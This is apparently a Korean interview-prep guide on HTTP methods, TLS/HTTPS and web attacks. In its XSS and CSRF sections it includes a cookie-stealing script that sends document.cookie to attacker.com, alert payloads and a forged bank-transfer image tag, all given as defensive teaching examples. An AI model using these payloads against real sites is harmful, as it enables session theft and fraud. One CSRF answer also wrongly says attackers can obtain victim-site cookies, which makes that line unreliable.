## HTTP Method

### HTTP Method 에 대해 설명해 주세요

**답변:**
HTTP Method는 클라이언트가 서버에 요청할 때 수행하고자 하는 동작을 나타내는 명령어입니다. 주요 HTTP Method는 다음과 같습니다:

- **GET**: 서버로부터 리소스를 조회할 때 사용. 멱등성과 안전성을 보장
- **POST**: 새로운 리소스를 생성하거나 서버에 데이터를 전송할 때 사용. 멱등성 보장 안 됨
- **PUT**: 리소스를 전체적으로 업데이트할 때 사용. 멱등성 보장
- **PATCH**: 리소스의 일부만 수정할 때 사용. 멱등성은 구현에 따라 다름
- **DELETE**: 리소스를 삭제할 때 사용. 멱등성 보장
- **HEAD**: GET과 동일하지만 응답 본문 없이 헤더만 반환
- **OPTIONS**: 서버가 지원하는 HTTP Method를 확인할 때 사용

각 Method는 의미론적(semantic)으로 정의되어 있으며, RESTful API 설계 시 리소스에 대한 CRUD 작업을 명확하게 표현하는 데 사용됩니다.

**꼬리질문:**

- Q: HTTP Method를 잘못 사용하면 어떤 문제가 발생할 수 있나요?
- A: 캐싱 동작이 예상과 다르게 작동하거나, 브라우저의 자동 재시도로 인해 중복 요청이 발생할 수 있습니다. 예를 들어, POST를 GET처럼 사용하면 브라우저가 자동으로 재전송할 때 데이터가 중복 생성될 수 있습니다. 또한 프록시나 CDN 같은 중간 서버들이 Method의 의미에 따라 다르게 동작하므로, 표준에 맞지 않는 사용은 예측 불가능한 동작을 유발할 수 있습니다.

- Q: 실제 프로젝트에서 HTTP Method를 선택할 때 고려해야 할 사항은 무엇인가요?
- A: 첫째, 리소스의 상태 변경 여부를 고려합니다. 조회만 하는 경우 GET을, 상태를 변경하는 경우 POST/PUT/PATCH/DELETE를 사용합니다. 둘째, 멱등성과 안전성을 고려합니다. 같은 요청을 여러 번 보내도 결과가 같아야 하는 경우 PUT이나 DELETE를 사용합니다. 셋째, RESTful 원칙을 따르되, 실용성을 고려합니다. 예를 들어, 복잡한 검색 쿼리의 경우 GET의 쿼리 스트링 길이 제한 때문에 POST를 사용하기도 합니다.

### HTTP Method의 멱등성에 대해 설명해 주세요.

**답변:**
멱등성(Idempotency)은 같은 요청을 여러 번 실행해도 결과가 동일한 성질을 의미합니다. HTTP Method의 멱등성은 다음과 같이 분류됩니다:

**멱등성을 보장하는 Method:**

- **GET**: 여러 번 호출해도 동일한 리소스를 조회하므로 멱등
- **PUT**: 같은 리소스를 같은 값으로 여러 번 업데이트해도 결과가 동일하므로 멱등
- **DELETE**: 이미 삭제된 리소스를 다시 삭제해도 결과(404)가 동일하므로 멱등
- **HEAD**: GET과 동일하게 멱등

**멱등성을 보장하지 않는 Method:**

- **POST**: 같은 요청을 여러 번 보내면 리소스가 중복 생성될 수 있어 멱등하지 않음
- **PATCH**: 구현에 따라 다르지만, 일반적으로 멱등성을 보장하지 않음

멱등성은 네트워크 오류로 인한 자동 재시도나 브라우저의 뒤로가기 동작에서 중요한 개념입니다. 멱등한 Method는 안전하게 재시도할 수 있지만, 멱등하지 않은 Method는 중복 요청 방지 메커니즘이 필요합니다.

**꼬리질문:**

- Q: POST 요청도 멱등하게 만들 수 있나요?
- A: 네, 가능합니다. 서버 측에서 중복 요청을 감지하고 처리하는 로직을 구현하면 됩니다. 예를 들어, 클라이언트가 고유한 요청 ID(idempotency key)를 생성하여 헤더에 포함시키고, 서버는 이 ID를 기반으로 중복 요청을 필터링할 수 있습니다. 이는 결제나 주문 생성 같은 중요한 작업에서 자주 사용되는 패턴입니다.

- Q: 멱등성과 안전성(Safety)의 차이는 무엇인가요?
- A: 안전성은 서버의 상태를 변경하지 않는 성질을 의미하며, GET과 HEAD만 안전한 Method입니다. 멱등성은 상태를 변경할 수 있지만, 여러 번 실행해도 결과가 동일한 성질입니다. 예를 들어, DELETE는 안전하지 않지만(리소스를 삭제하므로) 멱등합니다(같은 리소스를 여러 번 삭제해도 결과가 동일).

### GET과 POST의 차이는 무엇인가요?

**답변:**
GET과 POST의 주요 차이는 다음과 같습니다:

**1. 목적과 사용 용도:**

- **GET**: 서버로부터 리소스를 조회(Read)할 때 사용. 데이터를 가져오는 용도
- **POST**: 서버에 데이터를 전송하여 리소스를 생성(Create)하거나 처리할 때 사용

**2. 데이터 전송 방식:**

- **GET**: URL의 쿼리 스트링에 데이터를 포함 (예: `/users?id=123`)
- **POST**: 요청 본문(Body)에 데이터를 포함

**3. 캐싱:**

- **GET**: 브라우저나 프록시 서버에서 캐싱 가능
- **POST**: 일반적으로 캐싱되지 않음

**4. 멱등성과 안전성:**

- **GET**: 멱등하고 안전함 (서버 상태 변경 없음)
- **POST**: 멱등하지 않고 안전하지 않음 (서버 상태 변경 가능)

**5. 데이터 크기 제한:**

- **GET**: URL 길이 제한으로 인해 데이터 크기 제한이 있음 (일반적으로 2048자)
- **POST**: 본문 크기 제한이 상대적으로 큼

**6. 브라우저 동작:**

- **GET**: 북마크 가능, 히스토리에 남음, 자동 재전송 가능
- **POST**: 북마크 시 주의 필요, 히스토리에 남지만 재전송 시 경고 표시

**꼬리질문:**

- Q: GET 요청으로도 데이터를 전송할 수 있는데, 왜 POST를 사용하나요?
- A: GET은 URL에 데이터가 노출되므로 민감한 정보(비밀번호, 토큰 등)를 전송하기에 부적합합니다. 또한 URL 길이 제한이 있고, 브라우저 히스토리나 서버 로그에 남을 수 있어 보안상 위험합니다. POST는 본문에 데이터를 포함하므로 더 안전하고, 큰 데이터도 전송할 수 있습니다.

- Q: 검색 기능을 구현할 때 GET과 POST 중 어떤 것을 사용해야 하나요?
- A: 일반적으로 GET을 사용합니다. 검색은 서버 상태를 변경하지 않는 조회 작업이므로 GET이 적합합니다. 또한 검색 결과를 캐싱할 수 있고, URL을 공유하여 같은 검색 결과를 볼 수 있다는 장점이 있습니다. 다만, 검색 조건이 매우 복잡하거나 길이가 긴 경우(예: 여러 필드의 복잡한 쿼리)에는 POST를 사용하기도 합니다.

### POST와 PUT, PATCH의 차이는 무엇인가요?

**답변:**
POST, PUT, PATCH는 모두 서버의 상태를 변경하는 Method이지만, 사용 목적과 동작 방식이 다릅니다:

**POST (Create):**

- 새로운 리소스를 생성할 때 사용
- 리소스의 ID는 서버가 생성
- 멱등하지 않음 (같은 요청을 여러 번 보내면 여러 리소스 생성)
- 예: `/users`에 POST → 새로운 사용자 생성

**PUT (Update/Replace):**

- 리소스를 전체적으로 교체(Replace)할 때 사용
- 클라이언트가 리소스의 전체 상태를 제공
- 멱등함 (같은 요청을 여러 번 보내도 결과 동일)
- 리소스가 없으면 생성, 있으면 전체 교체
- 예: `/users/123`에 PUT → ID 123인 사용자 전체 정보 교체

**PATCH (Partial Update):**

- 리소스의 일부만 수정할 때 사용
- 클라이언트가 변경할 필드만 제공
- 멱등성은 구현에 따라 다름 (일반적으로 멱등하게 구현 권장)
- 예: `/users/123`에 PATCH → 사용자의 이름만 변경

**주요 차이점 요약:**

- **POST**: 리소스 생성, ID는 서버가 결정
- **PUT**: 리소스 전체 교체, 클라이언트가 ID 지정 가능, 멱등
- **PATCH**: 리소스 일부 수정, 멱등성은 구현에 따라 다름

**꼬리질문:**

- Q: PUT으로도 리소스를 생성할 수 있다고 했는데, POST와 어떤 차이가 있나요?
- A: PUT은 클라이언트가 리소스의 ID를 알고 지정할 수 있을 때 사용합니다. 예를 들어, `/users/123`에 PUT을 보내면 "ID가 123인 사용자를 이 정보로 교체하거나 생성하라"는 의미입니다. 반면 POST는 `/users`에 보내면 서버가 새로운 ID를 생성합니다. PUT은 멱등하지만 POST는 멱등하지 않다는 차이도 있습니다.

- Q: PATCH를 멱등하게 만들려면 어떻게 해야 하나요?
- A: 조건부 업데이트를 사용하면 됩니다. 예를 들어, "이메일을 변경하되, 현재 이메일이 old@example.com일 때만"과 같은 조건을 추가하거나, 버전 번호나 타임스탬프를 사용하여 동시성 제어를 구현할 수 있습니다. 또는 JSON Patch 표준을 사용하여 명확한 연산(예: "replace", "add", "remove")을 정의하면 멱등성을 보장하기 쉽습니다.

### HTTP 1.1 이후로, GET에도 Body에 데이터를 실을 수 있게 되었습니다. 그럼에도 불구하고 왜 아직도 이런 방식을 지양하는 것일까요?

**답변:**
HTTP 1.1 스펙상으로는 GET 요청에 Body를 포함하는 것이 기술적으로 금지되어 있지는 않지만, 다음과 같은 이유로 지양됩니다:

**1. 표준과의 불일치:**

- HTTP 스펙에서 GET의 Body는 "의미가 없다"고 명시되어 있음
- 많은 서버, 프록시, 라이브러리가 GET의 Body를 무시하거나 처리하지 않음

**2. 캐싱 문제:**

- GET 요청은 캐싱의 기본 단위가 URL인데, Body가 있으면 캐싱 키를 결정하기 어려움
- 프록시 서버나 CDN이 Body를 고려하지 않고 URL만으로 캐싱할 수 있음

**3. 호환성 문제:**

- 많은 HTTP 클라이언트 라이브러리와 브라우저가 GET의 Body를 제거하거나 무시
- 기존 인프라(프록시, 방화벽, 로드밸런서)가 GET의 Body를 처리하지 않을 수 있음

**4. 의미론적 혼란:**

- GET은 "가져오기"를 의미하는데, Body에 데이터를 포함하면 POST와의 구분이 모호해짐
- RESTful 원칙에 어긋남

**5. 보안 및 로깅:**

- URL에 데이터가 노출되지 않지만, 서버 로그나 프록시 로그에 Body가 기록될 수 있음
- GET의 본래 목적(안전한 조회)과 맞지 않음

**대안:**

- 복잡한 검색 조건: POST를 사용하거나, 쿼리 스트링을 사용
- 큰 데이터 전송: POST 사용

**꼬리질문:**

- Q: 그렇다면 복잡한 검색 쿼리를 보낼 때는 어떻게 해야 하나요?
- A: 일반적으로 두 가지 방법을 사용합니다. 첫째, 쿼리 스트링을 사용하되 URL 길이 제한 내에서 가능한 만큼 포함합니다. 둘째, URL 길이를 초과하거나 매우 복잡한 경우 POST를 사용합니다. 예를 들어, Elasticsearch 같은 검색 엔진은 복잡한 쿼리를 POST의 Body에 JSON으로 담아 보냅니다. 이는 "검색"이라는 의미상 조회 작업이지만, 실용성을 위해 POST를 사용하는 것입니다.

- Q: GraphQL 같은 기술에서는 GET에 쿼리를 Body에 담지 않나요?
- A: GraphQL도 일반적으로 POST를 사용합니다. GET을 사용하는 경우 쿼리를 URL의 쿼리 스트링에 인코딩하여 보냅니다. GraphQL 스펙에서도 GET의 Body 사용은 권장하지 않으며, 쿼리가 짧은 경우에만 GET을 사용하고, 긴 경우 POST를 사용하도록 권장합니다.

## **HTTPS 및 보안**

### 공개키와 대칭키에 대해 설명해 주세요.

**답변:**
공개키와 대칭키는 암호화 방식의 두 가지 주요 유형입니다:

**대칭키 암호화 (Symmetric Key Cryptography):**

- **개념**: 암호화와 복호화에 동일한 키를 사용
- **장점**:
  - 암호화/복호화 속도가 빠름
  - 계산 리소스가 적게 필요
- **단점**:
  - 키 교환 문제: 안전하게 키를 공유하는 방법이 필요
  - 키 관리 복잡도: 통신하는 상대방마다 다른 키 필요
- **예시**: AES, DES, 3DES
- **사용 사례**: 대용량 데이터 암호화, HTTPS의 실제 데이터 전송

**공개키 암호화 (Public Key Cryptography / Asymmetric Key Cryptography):**

- **개념**: 공개키와 개인키(비밀키) 쌍을 사용. 공개키로 암호화하면 개인키로만 복호화 가능
- **장점**:
  - 키 교환 문제 해결: 공개키는 공개해도 안전
  - 디지털 서명 가능: 개인키로 서명, 공개키로 검증
- **단점**:
  - 암호화/복호화 속도가 느림
  - 계산 리소스가 많이 필요
- **예시**: RSA, ECC (Elliptic Curve Cryptography)
- **사용 사례**: 키 교환, 디지털 서명, 인증서

**HTTPS에서의 활용:**
HTTPS는 두 방식을 모두 사용합니다:

1. **Handshake 단계**: 공개키 암호화로 대칭키를 안전하게 교환
2. **데이터 전송 단계**: 교환된 대칭키로 실제 데이터를 빠르게 암호화

이렇게 하면 공개키의 안전성과 대칭키의 효율성을 모두 활용할 수 있습니다.

**꼬리질문:**

- Q: 공개키 암호화만 사용하면 안 되나요? 왜 대칭키를 함께 사용하나요?
- A: 공개키 암호화는 계산 비용이 매우 높아서 대용량 데이터를 암호화하기에는 비효율적입니다. 예를 들어, RSA로 1MB 데이터를 암호화하는 데 수 초가 걸릴 수 있지만, AES(대칭키)로는 밀리초 단위로 처리됩니다. 따라서 HTTPS는 Handshake에서만 공개키를 사용하여 대칭키를 안전하게 교환하고, 이후 실제 데이터는 빠른 대칭키로 암호화합니다. 이는 하이브리드 암호화 방식이라고 합니다.

- Q: 대칭키를 안전하게 교환하는 방법은 무엇인가요?
- A: Diffie-Hellman 키 교환 알고리즘이 대표적인 방법입니다. 이 방식은 공개 채널을 통해 통신하면서도 각자만 알고 있는 비밀값을 사용하여 공통의 대칭키를 생성합니다. 중간자 공격을 방지하기 위해 서버의 공개키가 인증서에 포함되어 있고, 클라이언트는 이 인증서를 검증하여 서버의 신원을 확인합니다. 최신 TLS에서는 ECDHE(Elliptic Curve Diffie-Hellman Ephemeral)를 주로 사용합니다.

### 왜 HTTPS Handshake 과정에서는 인증서를 사용하는 것 일까요?

**답변:**
HTTPS Handshake에서 인증서를 사용하는 이유는 **중간자 공격(Man-in-the-Middle Attack)을 방지**하기 위해서입니다.

**문제 상황:**
공개키 암호화만 사용하면, 클라이언트가 받은 공개키가 정말 서버의 공개키인지 확인할 방법이 없습니다. 공격자가 중간에 개입하여 자신의 공개키를 서버인 것처럼 전달할 수 있습니다.

**인증서의 역할:**

1. **신원 확인**: 인증서는 신뢰할 수 있는 제3자(CA, Certificate Authority)가 서버의 신원을 확인하고 서명한 문서입니다.
2. **공개키 검증**: 인증서에는 서버의 공개키가 포함되어 있으며, CA의 개인키로 서명되어 있어 위조가 어렵습니다.
3. **체인 검증**: 클라이언트는 CA의 공개키(루트 인증서)를 미리 가지고 있어, 인증서 체인을 따라 검증할 수 있습니다.

**Handshake 과정:**

1. 서버가 인증서를 클라이언트에 전송
2. 클라이언트가 인증서의 유효성 검증 (만료일, 도메인 일치, CA 서명 검증)
3. 검증 성공 시, 인증서에 포함된 서버의 공개키를 신뢰
4. 해당 공개키로 대칭키를 암호화하여 전송

**인증서 없이의 문제점:**

- 공격자가 중간에 자신의 공개키를 전달할 수 있음
- 클라이언트는 가짜 서버와 통신하게 됨
- 모든 데이터가 공격자에게 노출됨

**꼬리질문:**

- Q: 자체 서명 인증서(Self-signed Certificate)는 왜 브라우저에서 경고를 표시하나요?
- A: 자체 서명 인증서는 신뢰할 수 있는 CA가 서명하지 않았기 때문에, 클라이언트가 서버의 신원을 검증할 수 없습니다. 브라우저는 미리 설치된 루트 CA 목록을 가지고 있는데, 자체 서명 인증서는 이 목록에 없어서 검증에 실패합니다. 개발 환경에서는 사용할 수 있지만, 프로덕션에서는 공인 CA에서 발급한 인증서를 사용해야 합니다.

- Q: CA가 해킹당하면 어떻게 되나요?
- A: CA가 해킹당하면 해당 CA가 발급한 모든 인증서의 신뢰성이 훼손됩니다. 이 경우 CA는 해당 인증서들을 취소하고 CRL(Certificate Revocation List)이나 OCSP(Online Certificate Status Protocol)를 통해 무효화합니다. 또한 브라우저나 운영체제는 해당 CA의 루트 인증서를 신뢰 목록에서 제거할 수 있습니다. 2011년 DigiNotar 사건이 대표적인 사례입니다.

### SSL과 TLS의 차이는 무엇인가요?

**답변:**
SSL(Secure Sockets Layer)과 TLS(Transport Layer Security)는 모두 암호화 통신 프로토콜이지만, TLS가 SSL의 후속 버전입니다.

**역사적 배경:**

- **SSL 1.0**: 공개되지 않음
- **SSL 2.0**: 1995년 발표, 보안 취약점으로 인해 폐기
- **SSL 3.0**: 1996년 발표, 2014년 POODLE 공격으로 인해 폐기
- **TLS 1.0**: 1999년 발표 (SSL 3.0의 업그레이드)
- **TLS 1.1**: 2006년 발표
- **TLS 1.2**: 2008년 발표, 현재 널리 사용
- **TLS 1.3**: 2018년 발표, 최신 표준

**주요 차이점:**

**1. 명칭:**

- SSL은 Netscape가 개발한 프로토콜
- TLS는 IETF가 표준화한 프로토콜 (SSL 3.0을 기반으로 개선)

**2. 보안 강화:**

- TLS는 SSL의 보안 취약점을 개선
- 더 강력한 암호화 알고리즘 지원
- 더 안전한 키 교환 방식

**3. 호환성:**

- TLS는 SSL과 하위 호환성을 유지하도록 설계
- TLS 클라이언트는 SSL 3.0 서버와 통신 가능 (하지만 권장하지 않음)

**4. 현대적 사용:**

- 현재는 "SSL"이라는 용어가 여전히 널리 사용되지만, 실제로는 TLS를 의미
- "SSL 인증서"라고 불리지만, 실제로는 TLS에서 사용되는 인증서

**현재 권장 사항:**

- TLS 1.2 이상 사용 권장
- TLS 1.0, 1.1은 보안 취약점으로 인해 폐기됨
- TLS 1.3이 가장 안전하고 빠름

**꼬리질문:**

- Q: 왜 여전히 "SSL 인증서"라고 부르나요? "TLS 인증서"라고 부르지 않나요?
- A: 역사적 관습 때문입니다. SSL이 먼저 널리 알려졌고, 인증서도 "SSL 인증서"로 불리기 시작했습니다. 기술적으로는 TLS에서도 동일한 X.509 인증서 형식을 사용하므로, 용어가 혼용되고 있습니다. 실제로는 "TLS 인증서" 또는 단순히 "인증서"라고 부르는 것이 더 정확하지만, 업계에서는 "SSL 인증서"라는 용어가 여전히 널리 사용됩니다.

- Q: TLS 1.3의 주요 개선사항은 무엇인가요?
- A: TLS 1.3의 주요 개선사항은 다음과 같습니다: 1) Handshake 속도 향상 - 1-RTT(한 번의 왕복)로 연결 가능, 2) 보안 강화 - 취약한 암호화 알고리즘 제거, Perfect Forward Secrecy 필수, 3) 암호화된 Handshake - 서버 이름(SNI)도 암호화, 4) 0-RTT 모드 지원 - 이전에 연결한 서버와는 추가 왕복 없이 즉시 데이터 전송 가능. 이러한 개선으로 지연 시간이 줄어들고 보안이 강화되었습니다.

### XSS에 대해서 설명해 주세요.

**답변:**
XSS(Cross-Site Scripting)는 웹 애플리케이션의 취약점을 이용하여 악성 스크립트를 웹 페이지에 삽입하는 공격 기법입니다.

**공격 원리:**

1. 공격자가 악성 JavaScript 코드를 웹 애플리케이션에 삽입
2. 사용자가 해당 페이지를 방문하면 악성 스크립트가 실행
3. 스크립트가 사용자의 쿠키, 세션 토큰, 개인정보 등을 탈취하거나 페이지를 변조

**XSS 유형:**

**1. 저장형 XSS (Stored/Persistent XSS):**

- 악성 스크립트가 서버에 저장되어 지속적으로 실행
- 예: 게시판에 악성 스크립트가 포함된 게시글 작성 → 다른 사용자들이 게시글을 볼 때마다 실행

**2. 반사형 XSS (Reflected XSS):**

- 악성 스크립트가 URL 파라미터 등에 포함되어 즉시 반영
- 예: 검색어에 `<script>alert('XSS')</script>` 입력 → 서버가 이를 그대로 응답에 포함

**3. DOM 기반 XSS:**

- 클라이언트 측 JavaScript가 DOM을 조작하는 과정에서 발생
- 서버와의 통신 없이 브라우저에서만 발생

**공격 예시:**

```javascript
// 게시글에 삽입된 악성 코드
<script>
  // 쿠키 탈취
  document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

**방어 방법:**

1. **입력 검증 및 출력 인코딩**: 사용자 입력을 검증하고, 출력 시 HTML 특수문자를 이스케이프
2. **CSP (Content Security Policy)**: 허용된 스크립트 소스만 실행되도록 제한
3. **HttpOnly 쿠키**: JavaScript에서 쿠키 접근 불가하도록 설정
4. **XSS 필터 라이브러리 사용**: DOMPurify 등

**꼬리질문:**

- Q: XSS 공격으로 어떤 피해를 입을 수 있나요?
- A: 주요 피해는 다음과 같습니다:

1. 세션 하이재킹 - 사용자의 세션 쿠키를 탈취하여 계정 탈취
2. 개인정보 유출 - 페이지에 입력한 정보나 저장된 데이터 탈취
3. 피싱 - 페이지를 변조하여 가짜 로그인 폼 표시
4. 악성 코드 유포 - 다른 사용자들에게 악성 링크나 스크립트 전파
5. 권한 상승 - 관리자 계정으로 위장한 작업 수행. 특히 관리자 계정이 XSS에 노출되면 전체 시스템이 위험해질 수 있습니다.

- Q: React나 Vue 같은 프레임워크를 사용하면 XSS가 자동으로 방지되나요?
- A: 부분적으로 방지됩니다. React와 Vue는 기본적으로 출력 시 자동으로 이스케이프 처리하므로, 대부분의 XSS 공격을 방지합니다. 하지만 `dangerouslySetInnerHTML`(React)나 `v-html`(Vue) 같은 기능을 사용하면 여전히 위험합니다. 또한 외부 라이브러리나 서드파티 컴포넌트에서 발생할 수 있으므로, CSP 설정과 입력 검증은 여전히 필요합니다.

### CSRF랑 XSS는 어떤 차이가 있나요?

**답변:**
CSRF(Cross-Site Request Forgery)와 XSS(Cross-Site Scripting)는 모두 웹 보안 취약점이지만, 공격 방식과 목표가 다릅니다:

**XSS (Cross-Site Scripting):**

- **공격 대상**: 사용자의 브라우저
- **공격 방식**: 악성 스크립트를 웹 페이지에 삽입하여 실행
- **목표**: 사용자의 세션/쿠키 탈취, 페이지 변조, 개인정보 유출
- **실행 위치**: 피해 사이트에서 실행
- **예시**: 게시판에 `<script>alert(document.cookie)</script>` 삽입

**CSRF (Cross-Site Request Forgery):**

- **공격 대상**: 사용자가 인증한 웹 사이트
- **공격 방식**: 사용자가 인증한 상태에서 악성 요청을 위조하여 전송
- **목표**: 사용자 모르게 서버에 요청을 보내어 상태 변경 (예: 비밀번호 변경, 송금)
- **실행 위치**: 공격자 사이트에서 실행, 요청은 피해 사이트로 전송
- **예시**: `<img src="http://bank.com/transfer?to=attacker&amount=1000">` 삽입

**주요 차이점 요약:**

| 구분          | XSS                       | CSRF                        |
| ------------- | ------------------------- | --------------------------- |
| 공격 방향     | 사이트 → 사용자           | 사용자 → 사이트             |
| 스크립트 실행 | 피해 사이트에서           | 공격자 사이트에서           |
| 쿠키 접근     | 가능 (HttpOnly 아닌 경우) | 불가능 (Same-Origin Policy) |
| 방어 방법     | 출력 인코딩, CSP          | CSRF 토큰, SameSite 쿠키    |

**공격 시나리오 비교:**

**XSS 공격:**

1. 공격자가 게시판에 악성 스크립트 삽입
2. 사용자가 게시글을 읽음
3. 사용자 브라우저에서 스크립트 실행
4. 사용자의 쿠키가 공격자에게 전송

**CSRF 공격:**

1. 사용자가 은행 사이트에 로그인 (쿠키 저장)
2. 사용자가 공격자 사이트 방문
3. 공격자 사이트의 악성 코드가 은행 사이트로 요청 전송
4. 사용자의 쿠키가 자동으로 포함되어 요청 실행

**꼬리질문:**

- Q: XSS와 CSRF를 동시에 사용하는 공격이 가능한가요?
- A: 네, 가능합니다. XSS를 통해 CSRF 토큰을 탈취한 후, CSRF 공격을 수행할 수 있습니다. 예를 들어, XSS로 페이지의 CSRF 토큰을 읽어서 공격자 서버로 전송하고, 그 토큰을 사용하여 유효한 CSRF 요청을 만들 수 있습니다. 또한 XSS로 직접 악성 요청을 보낼 수도 있어, CSRF 방어만으로는 부족합니다. 따라서 XSS와 CSRF 방어를 모두 구현해야 합니다.

- Q: CSRF 토큰은 어떻게 작동하나요?
- A: CSRF 토큰은 서버가 생성한 랜덤한 값으로, 각 사용자 세션마다 고유합니다. 폼 제출 시 이 토큰을 함께 전송하고, 서버는 토큰이 유효한지 검증합니다. 공격자는 피해 사이트의 쿠키는 가져올 수 있지만(Same-Origin Policy), CSRF 토큰은 알 수 없으므로 유효한 요청을 만들 수 없습니다. 토큰은 세션 쿠키와 함께 저장되거나, 폼에 hidden 필드로 포함됩니다.

### XSS는 프론트엔드에서만 막을 수 있나요?

**답변:**
아니요, XSS는 **프론트엔드와 백엔드 모두에서 방어**해야 합니다. 각 계층에서의 역할은 다음과 같습니다:

**백엔드에서의 방어 (필수):**

1. **입력 검증 및 출력 인코딩**:

   - 사용자 입력을 받을 때 검증
   - 데이터베이스에 저장하기 전에 이스케이프 처리
   - API 응답 시 적절한 인코딩 적용

2. **보안 헤더 설정**:

   - CSP (Content Security Policy) 헤더 설정
   - X-XSS-Protection 헤더 (구형 브라우저용)

3. **HttpOnly 쿠키**:
   - 세션 쿠키를 HttpOnly로 설정하여 JavaScript 접근 차단

**프론트엔드에서의 방어 (보조):**

1. **출력 인코딩**:

   - React, Vue 등은 기본적으로 자동 이스케이프
   - `dangerouslySetInnerHTML` 같은 위험한 기능 사용 지양

2. **입력 검증**:

   - 사용자 입력에 대한 클라이언트 측 검증 (UX 개선, 하지만 보안 목적 아님)

3. **CSP 준수**:
   - 프론트엔드 코드가 CSP 정책을 위반하지 않도록 주의

**왜 백엔드 방어가 필수인가:**

- **보안의 기본 원칙**: "Never trust client input" - 클라이언트는 항상 조작 가능
- **다양한 클라이언트**: 브라우저뿐만 아니라 모바일 앱, API 클라이언트 등 다양한 클라이언트 존재
- **프론트엔드 우회 가능**: 공격자는 브라우저 개발자 도구로 프론트엔드 검증을 우회할 수 있음

**방어 전략:**

- **Defense in Depth (다층 방어)**: 여러 계층에서 방어하여 한 계층이 실패해도 다른 계층이 보호
- **백엔드가 최종 방어선**: 프론트엔드 방어가 실패하거나 우회되어도 백엔드에서 차단

**꼬리질문:**

- Q: 백엔드에서 모든 입력을 이스케이프 처리하면 성능 문제가 없나요?
- A: 현대적인 웹 애플리케이션에서는 성능 영향이 미미합니다. 이스케이프 처리는 단순한 문자열 치환이므로 매우 빠릅니다. 또한 대부분의 경우 데이터베이스에 저장할 때는 원본을 저장하고, 출력할 때만 이스케이프 처리합니다(저장 시점과 출력 시점의 컨텍스트가 다를 수 있으므로). 만약 성능이 문제라면, 캐싱이나 CDN을 활용하여 해결할 수 있습니다. 보안을 위해 성능을 포기하는 것은 현명하지 않지만, 이 경우 성능 영향은 거의 없습니다.

- Q: API 서버의 경우에도 XSS 방어가 필요한가요?
- A: 네, 필요합니다. API 서버가 JSON을 반환하더라도, 클라이언트가 이를 HTML에 삽입할 때 XSS가 발생할 수 있습니다. 예를 들어, API가 `{"name": "<script>alert('XSS')</script>"}`를 반환하면, 클라이언트가 이를 `innerHTML`에 삽입할 때 문제가 됩니다. 따라서 API는 적절한 Content-Type 헤더를 설정하고, 필요시 데이터를 인코딩하거나 클라이언트에 안전한 사용 방법을 안내해야 합니다. 또한 API 문서에서 XSS 방지를 위한 가이드라인을 제공하는 것이 좋습니다.
